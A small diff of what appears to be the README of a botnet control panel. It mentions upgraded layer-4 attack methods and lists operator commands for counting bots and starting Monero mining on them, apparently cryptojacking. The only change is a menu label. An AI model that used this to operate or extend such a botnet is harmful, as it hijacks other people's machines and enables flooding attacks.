@@ -12,7 +12,7 @@ github.com/udbnt  - Upgraded l4 methods
 
 # Commands
 * help # Help menu
-* bots # Online bots
+* bots # Total bots
 * clear # Clear Terminal
 * Stat # Miners statue
 * miner pool:port monero_wallet worker_name # Monero CPU + GPU Mining (xmrig.com/wizard)
